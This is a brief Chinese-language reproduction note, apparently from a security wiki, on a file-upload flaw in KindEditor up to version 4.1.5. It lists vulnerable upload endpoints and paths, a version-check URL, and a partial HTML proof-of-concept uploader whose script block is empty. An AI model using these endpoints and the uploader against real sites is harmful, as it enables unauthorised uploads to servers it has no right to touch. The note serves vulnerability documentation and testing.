# Kindeditor <=4.1.5 上传漏洞

### 一、漏洞简介

漏洞存在于kindeditor编辑器里，你能上传.txt和.html文件，支持php/asp/jsp/asp.net,漏洞存在于小于等于kindeditor4.1.5编辑器中

### 二、漏洞影响

Kindeditor <=4.1.5

### 三、复现过程

json文件地址


```bash
/asp/upload_json.asp

/asp.net/upload_json.ashx

/jsp/upload_json.jsp

/php/upload_json.php
```

上传路径


```bash
kindeditor/asp/upload_json.asp?dir=file

kindeditor/asp.net/upload_json.ashx?dir=file

kindeditor/jsp/upload_json.jsp?dir=file

kindeditor/php/upload_json.php?dir=file
```

查看版本信息


```bash
http://url/kindeditor//kindeditor.js
```

![](images/15891200317771.jpg)


构造poc


```html
<html><head>
<title>Uploader</title>
<script src="http://www.0-sec.org/kindeditor//kindeditor.js"></script>
<script></script></head><body>
<div class="upload">
<input class="ke-input-text" type="text" id="url" value="" readonly="readonly" />
<input type="button" id="uploadButton" value="Upload" />
</div>
</body>
</html>
```